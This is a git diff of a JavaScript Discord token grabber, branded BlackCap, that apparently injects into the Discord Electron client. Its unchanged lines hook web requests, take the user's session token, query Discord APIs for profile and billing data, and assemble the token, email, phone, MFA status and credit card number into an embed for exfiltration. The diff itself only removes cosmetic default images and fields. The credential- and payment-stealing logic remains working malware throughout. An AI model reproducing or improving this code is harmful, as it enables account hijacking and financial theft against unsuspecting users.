@@ -216,10 +216,7 @@ const FirstTime = async () => {
         var user = await getURL("https://discord.com/api/v8/users/@me", token);
         var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token);
         var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
-
         var Billings = parseBilling(billing);
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png";
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png";
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`);
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`);
@@ -236,7 +233,6 @@ const FirstTime = async () => {
                 { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
                 { name: "Token", value: `\`${token}\``, inline: false }
             ],
-            card:description,
             image: userBanner,
             thumbnail: userAvatar,
             color: 5639644
@@ -334,8 +330,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -358,7 +352,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
                     { name: "Token", value: `\`${token}\``, inline: false }
                 ],
-                card:description,
                 image: userBanner,
                 thumbnail: userAvatar,
                 color: 5639644
@@ -379,7 +372,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
                 **Email** <a:email:1041639672037785691>\n\`\`\`${user.email}\`\`\`\n
                 **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(user.premium_type)}\n
-                **Language** <:language:1041640473477001236>\n${GetLangue(user.locale)}\n
                 **A2F** <a:a2f:1040272766982692885>\n${GetA2F(user.mfa_enabled)}\n
                 **NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(user.nsfw_allowed)}\n
                 **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
